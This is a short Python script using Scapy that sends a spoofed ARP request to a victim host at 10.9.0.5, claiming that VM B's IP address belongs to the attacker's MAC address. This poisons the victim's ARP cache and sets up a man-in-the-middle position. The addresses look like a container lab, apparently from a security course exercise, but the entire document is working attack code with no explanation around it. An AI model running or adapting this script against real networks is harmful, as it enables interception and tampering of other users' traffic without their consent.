#!/usr/bin/env python3
from scapy.all import *

VM_A_IP = '10.9.0.5'
VM_A_MAC = '02:42:0a:09:00:05'


VM_B_IP = '10.9.0.6'
VM_B_MAC = '02:42:0a:09:00:06'

ATTACKER_MAC = '02:42:0a:09:00:69'
ATTACKER_IP = '10.9.0.105'

print("SENDING SPOOFED ARP REQUEST")

ether = Ether()
ether.dst = VM_A_MAC
ether.src = ATTACKER_MAC

arp = ARP()
arp.psrc = VM_B_IP
arp.hwsrc = ATTACKER_MAC

arp.pdst = VM_A_IP
arp.op = 1 #Request

frame = ether/arp
sendp(frame)
